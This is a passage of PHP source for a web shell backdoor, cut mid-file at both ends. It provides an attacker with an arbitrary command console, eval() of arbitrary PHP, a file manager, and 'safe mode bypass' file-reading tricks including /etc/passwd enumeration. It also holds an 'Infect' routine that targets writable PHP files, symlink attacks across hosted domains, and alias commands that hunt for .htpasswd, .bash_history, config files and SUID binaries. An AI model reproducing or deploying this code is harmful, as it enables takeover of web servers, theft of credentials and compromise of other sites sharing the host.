			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value="submit"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#12151d><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#12151d><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
			break;
		/* (С) 12.2015 mitryz */
		case 'frame':
			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
			if ($frameSrc[0] != '/')
				$frameSrc = '/' . $frameSrc;
			if ($frameSrc[strlen($frameSrc) - 1] != '/')
				$frameSrc = $frameSrc . '/';
			$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
			echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
			break;
	}
	echo '</div>';
	hardFooter();
}
if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
	if(isset($_POST['ajax'])) {
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	hardHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	
	echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
	}
	echo '</textarea><table class=main cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script>';
	hardFooter();
}
function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit; 
	}
	hardHeader();
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		echo '<h1>PHP info</h1><div class=content>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
		$tmp = preg_replace('!body {.*}!msiU','',$tmp);
		$tmp = preg_replace('!a:\w+ {.*}!msiU','',$tmp);
		$tmp = preg_replace('!h1!msiU','h2',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		$tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);
		echo $tmp;
		echo '</div><br>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	hardFooter();
}
function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if ( is_array($_FILES['f']['tmp_name']) ) {
					foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) {
                        if(!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) {
                                echo "Can't upload file!";
							}
						}
					}
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($microsoft = readdir($dh) ) !== false) {
						$microsoft = $path.$microsoft;
						if ( (basename($microsoft) == "..") || (basename($microsoft) == ".") )
							continue;
						$type = filetype($microsoft);
						if ($type == "dir")
							deleteDir($microsoft);
						else
							@unlink($microsoft);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
				} elseif($_COOKIE['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(@is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_COOKIE['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_COOKIE['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				} elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
				break;
			default:
                if(!empty($_POST['p1'])) {
					prototype('act', $_POST['p1']);
					prototype('f', serialize(@$_POST['f']));
					prototype('c', @$_POST['c']);
				}
				break;
		}
	}
    hardHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
	$dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';hardFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table class='fm main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function cmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "cmp");
	usort($dirs, "cmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	echo "<tr id=fak><td colspan=7>
	<input type=hidden name=ne value=''>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<label><select name='p1'>";
	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>↳ Paste</option>";
	echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
    echo "<option value='tar'>+ tar.gz</option>";
    echo "</select></label>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo "<input type='submit' value='submit'></td></tr></form></table></div>";
	hardFooter();
}
function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'ASCII to HEX' => 'ascii2hex',
		'HEX to ASCII' => 'hex2ascii',
		'HEX to DEC' => 'hexdec',
		'HEX to BIN' => 'hex2bin',
		'DEC to HEX' => 'dechex',
		'DEC to BIN' => 'decbin',
		'BIN to HEX' => 'binhex',
		'BIN to DEC' => 'bindec',
		'String to lower case' => 'strtolower',
		'String to upper case' => 'strtoupper',
		'Htmlspecialchars' => 'htmlspecialchars',
		'String length' => 'strlen',
	);
	if(isset($_POST['ajax'])) {
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	hardHeader();
	echo '<h1>String conversions</h1><div class=content>';
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select></label><input type='submit' value='submit'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div><br><h1>Search files:</h1><div class=content>
		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
			<tr><td></td><td><input type='submit' value='submit'></td></tr>
			</table></form>";
	function hardRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $microsoft) {
				if(@is_dir($microsoft)){
					if($path!=$microsoft)
						hardRecursiveGlob($microsoft);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($microsoft), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($microsoft)."\", \"view\",\"\")'>".htmlspecialchars($microsoft)."</a><br>";
				}
			}
		}
	}
	if(@$_POST['p3'])
		hardRecursiveGlob($_POST['c']);
	echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
            <input type='hidden' name='act' value='find'/>
			<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
			<input type='submit' value='toolki.com' onclick=\"document.hf.action='http://toolki.com/';document.hf.submit()\"><br>
			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
		</form></div>";
	hardFooter();
}
function actionSafeMode() {
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."\n";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH);
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."\n";
			}
			break;
		case 6:
			if(!function_exists('imap_open'))break;
			$stream = imap_open($_POST['p2'], "", "");
			if ($stream == FALSE)
				break;
			echo imap_body($stream, 1);
			imap_close($stream);
			break;
	}
	$temp = ob_get_clean();
	hardHeader();
	echo '<h1>Safe mode bypass</h1><div class=content>';
	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>';
	if($temp)
		echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>';
	echo '</div>';
	hardFooter();
}
function actionLogout() {
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
	die('bye!');
}
function actionSelfRemove() {
	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        hardHeader();
	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	hardFooter();
}

function actionInfect() {
	hardHeader();
	echo '<h1>Infect</h1><div class=content>';
	if($_POST['p1'] == 'infect') {
		$target=$_SERVER['DOCUMENT_ROOT'];
			function ListFiles($dir) {
				if($dh = opendir($dir)) {
					$files = Array();
					$inner_files = Array();
					while($file = readdir($dh)) {
						if($file != "." && $file != "..") {
							if(is_dir($dir . "/" . $file)) {
								$inner_files = ListFiles($dir . "/" . $file);
								if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
							} else {
								array_push($files, $dir . "/" . $file);
							}
						}
					}
					closedir($dh);
					return $files;
				}
			}
			foreach (ListFiles($target) as $key=>$file){
				$nFile = substr($file, -4, 4);
				if($nFile == ".php" ){
					if(($file<>$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])&&(is_writeable($file))){
						echo "$file<br>";
						$i++;
					}
				}
			}
			echo "<font color=red size=14>$i</font>";
		}else{
			echo "<form method=post><input type=submit value=Infect name=infet></form>";
			echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
		}
	hardFooter();
}


function actionSymlink() {
    hardHeader();
    echo '<h1>Symlink</h1>';
    $furl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
    $expld = explode('/',$furl );
    $burl =str_replace(end($expld),'',$furl);  
    
    echo '<div class="content"><center>
                <h3>[ <a href="#" onclick="g(\'symlink\',null,\'website\',null)">Domains</a> ] - 
                    [ <a href="#" onclick="g(\'symlink\',null,\'whole\',null)">Whole Server Symlink<sup style="color:red;text-decoration:blink;">New</sup></a> ] - 
                    [ <a href="#" onclick="g(\'symlink\',null,\'config\',null)">Config files symlink</a> ]</h3></center>';
    
    if(isset($_POST['p1']) && $_POST['p1']=='website')
    {
        echo "<center>";
        $d0mains = @file("/etc/named.conf");
        if(!$d0mains){ 
